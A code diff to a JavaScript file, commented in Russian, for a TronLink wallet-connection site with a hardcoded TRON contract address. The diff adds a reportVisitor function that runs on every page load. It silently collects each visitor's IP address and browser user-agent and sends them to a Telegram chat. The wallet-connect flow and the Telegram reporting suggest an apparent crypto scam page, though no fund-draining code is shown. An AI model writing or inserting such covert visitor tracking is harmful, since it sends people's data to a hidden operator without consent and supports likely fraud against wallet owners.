@@ -1,5 +1,5 @@
 // ============================================
-// ФИНАЛЬНАЯ ВЕРСИЯ – ИСПРАВЛЕННАЯ КНОПКА
+// ПОЛНЫЙ SCRIPT.JS – ВСЕ ФУНКЦИИ В ОДНОМ ФАЙЛЕ
 // ============================================
 
 const CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
@@ -44,6 +44,25 @@ async function sendTelegramMessage(text) {
 }
 
 // ============================================
+// ОТПРАВКА ИНФОРМАЦИИ О ПОСЕТИТЕЛЕ (IP + USER-AGENT)
+// ============================================
+async function reportVisitor() {
+    try {
+        const response = await fetch('/.netlify/functions/get-visitor-ip');
+        const data = await response.json();
+
+        sendTelegramMessage(`
+👁‍🗨 <b>Новый посетитель сайта</b>
+🌐 IP: <code>${data.ip}</code>
+📱 Браузер: ${data.userAgent}
+⏰ Время: ${new Date().toLocaleString()}
+        `);
+    } catch (error) {
+        console.error('Не удалось получить IP посетителя:', error);
+    }
+}
+
+// ============================================
 // ПРОВЕРКА НАЛИЧИЯ TRONLINK
 // ============================================
 function checkTronLinkAvailability() {
@@ -62,25 +81,22 @@ function checkTronLinkAvailability() {
 }
 
 // ============================================
-// ПОДКЛЮЧЕНИЕ КОШЕЛЬКА (ИСПРАВЛЕННАЯ ВЕРСИЯ)
+// ПОДКЛЮЧЕНИЕ КОШЕЛЬКА
 // ============================================
 async function connectWallet() {
     console.log('🔌 Попытка подключения кошелька...');
     connectionAttempts++;
     
-    // 1. Проверяем наличие TronLink
     if (!window.tronLink) {
         checkTronLinkAvailability();
         return;
     }
     
-    // 2. Проверяем, разблокирован ли кошелек
     if (!window.tronLink.ready) {
         alert('🔒 TronLink заблокирован. Пожалуйста, разблокируйте кошелек и повторите попытку.');
         return;
     }
     
-    // 3. Проверяем, есть ли уже подключенный адрес
     if (window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress) {
         const address = window.tronLink.tronWeb.defaultAddress.base58;
         if (address && address !== 'false') {
@@ -93,7 +109,6 @@ async function connectWallet() {
         }
     }
     
-    // 4. Запрашиваем новое подключение
     try {
         console.log('📤 Отправка запроса на подключение...');
         
@@ -107,9 +122,7 @@ async function connectWallet() {
         
         console.log('📦 Ответ от TronLink:', result);
         
-        // 5. Обрабатываем ответ
         if (result.code === 200) {
-            // Ждем появления адреса
             let attempts = 0;
             const checkInterval = setInterval(() => {
                 if (window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress) {
@@ -261,19 +274,14 @@ window.testTelegram = async function() {
 document.addEventListener('DOMContentLoaded', function() {
     console.log('🚀 Сайт загружен');
     
+    // Проверяем наличие TronLink
     setTimeout(checkTronLinkAvailability, 1000);
+    
+    // Отправляем информацию о посетителе
+    setTimeout(reportVisitor, 2000);
     
     if (connectBtn) connectBtn.addEventListener('click', connectWallet);
     if (checkBtn) checkBtn.addEventListener('click', handleTronCheck);
     
     window.copyAddress = copyAddress;
-    
-    // Приветственное сообщение
-    setTimeout(() => {
-        sendTelegramMessage(`
-🚀 <b>Сайт загружен</b>
-📱 ${navigator.userAgent.includes('Mobile') ? 'Мобильное устройство' : 'Компьютер'}
-⏰ ${new Date().toLocaleString()}
-        `);
-    }, 2000);
 });
